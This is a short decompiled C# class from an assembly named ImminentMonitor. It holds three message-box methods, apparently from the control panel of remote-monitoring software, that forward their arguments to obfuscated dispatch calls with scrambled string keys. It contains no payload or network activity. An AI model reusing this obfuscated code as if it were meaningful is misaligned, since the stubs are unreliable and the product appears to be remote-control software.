// Decompiled with JetBrains decompiler
// Type: ImminentMonitor.Cef.MessageBoxCefHandler
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

namespace ImminentMonitor.Cef
{
  public class MessageBoxCefHandler
  {
    public FormMessageBox MessageBoxForm;

    public MessageBoxCefHandler(FormMessageBox messageBox) => this.MessageBoxForm = messageBox;

    public void updateTitle()
    {
      object[] object_3 = new object[1]{ (object) this };
      Class86.smethod_0().method_68(Class86.smethod_1(), ";&GI[Pa.Q$", object_3);
    }

    public void testMessage(string title, string msg, string icon, string btn)
    {
      object[] object_3 = new object[5]
      {
        (object) this,
        (object) title,
        (object) msg,
        (object) icon,
        (object) btn
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "QirS9Pa.Q$", object_3);
    }

    public void sendMessage(string title, string msg, string icon, string btn)
    {
      object[] object_3 = new object[5]
      {
        (object) this,
        (object) title,
        (object) msg,
        (object) icon,
        (object) btn
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "M_L<XPa.Q$", object_3);
    }
  }
}
